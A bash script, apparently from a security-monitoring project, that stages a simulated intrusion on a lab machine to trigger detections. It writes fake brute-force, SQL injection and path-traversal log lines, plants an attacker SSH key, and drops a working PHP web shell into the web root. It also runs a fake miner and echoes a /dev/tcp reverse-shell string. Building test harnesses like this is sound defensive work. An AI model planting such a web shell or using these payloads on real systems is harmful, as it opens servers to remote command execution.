#!/usr/bin/env bash
# Generates a realistic attack sequence against a test agent so every
# detection layer fires. Use ONLY on a disposable lab machine.
#
#   scripts/simulate-attacks.sh <auth.log> <nginx access.log> <fim-watched-dir> [syslog-host:port]
#
# Writes synthetic log lines, drops a fake web shell and an SSH key, runs a
# renamed `sleep` as a "miner", a fake reverse-shell command line and a
# listener on port 4444. Nothing malicious is actually executed.
set -u
AUTH=${1:?auth.log path}; WEB=${2:?access.log path}; WATCH=${3:?watched dir}; SYSLOG=${4:-127.0.0.1:5514}
ts() { date '+%b %e %H:%M:%S'; }

echo "[1/7] SSH brute force and password spraying from 203.0.113.50"
for u in root admin oracle postgres ubuntu test; do
  echo "$(ts) web-01 sshd[2211]: Failed password for invalid user $u from 203.0.113.50 port $((40000 + RANDOM % 2000)) ssh2" >> "$AUTH"
done

echo "[2/7] Root login, root shell via sudo, backdoor account, sudo guessing"
echo "$(ts) web-01 sshd[2301]: Accepted password for root from 198.51.100.20 port 52211 ssh2" >> "$AUTH"
echo "$(ts) web-01 sudo:    deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash" >> "$AUTH"
echo "$(ts) web-01 useradd[2410]: new user: name=sysupdate, UID=1005, GID=1005, home=/home/sysupdate, shell=/bin/bash" >> "$AUTH"
echo "$(ts) web-01 usermod[2412]: add 'sysupdate' to group 'sudo'" >> "$AUTH"
for i in 1 2 3; do
  echo "$(ts) web-01 sudo:    intern : 3 incorrect password attempts ; TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow" >> "$AUTH"
done

echo "[3/7] SQL injection, path traversal and a directory brute-force scan"
d=$(date '+%d/%b/%Y:%H:%M:%S %z')
echo "203.0.113.77 - - [$d] \"GET /products.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\" 200 512 \"-\" \"sqlmap/1.8.2#stable\"" >> "$WEB"
echo "203.0.113.77 - - [$d] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 400 0 \"-\" \"curl/8.5\"" >> "$WEB"
for p in admin wp-admin .git/config .env backup.zip phpmyadmin config.php old test server-status api/v1 console \
         login.jsp manager/html .DS_Store db.sql dump.sql shell.php cgi-bin/ wp-login.php xmlrpc.php actuator/health; do
  echo "203.0.113.77 - - [$d] \"GET /$p HTTP/1.1\" 404 153 \"-\" \"gobuster/3.6\"" >> "$WEB"
done

echo "[4/7] Persistence: attacker SSH key and a PHP web shell"
mkdir -p "$WATCH/home/bob/.ssh"
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAttackerKey attacker@evil" > "$WATCH/home/bob/.ssh/authorized_keys"
mkdir -p /var/www/html && echo '<?php system($_GET["c"]); ?>' > /var/www/html/shell.php

echo "[5/7] Fake miner in /tmp and a reverse-shell style command line"
cp /bin/sleep /tmp/xmrig && (/tmp/xmrig 90 &)
PAYLOAD="/dev/""tcp/203.0.113.9/4444"
(sh -c "sleep 90; echo $PAYLOAD" &)

echo "[6/7] Listener on port 4444"
(python3 -c 'import socket,time;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",4444));s.listen();time.sleep(90)' &)

echo "[7/7] Agentless firewall sending syslog to ${SYSLOG}"
python3 - "$SYSLOG" <<'EOF'
import socket, sys, time
host, port = sys.argv[1].rsplit(":", 1)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
t = time.strftime('%b %e %H:%M:%S')
for u in ['admin', 'cisco', 'root', 'support', 'guest']:
    s.sendto(f"<38>{t} edge-fw sshd[991]: Failed password for {u} from 192.0.2.66 port 50122 ssh2".encode(), (host, int(port)))
EOF
echo "done"
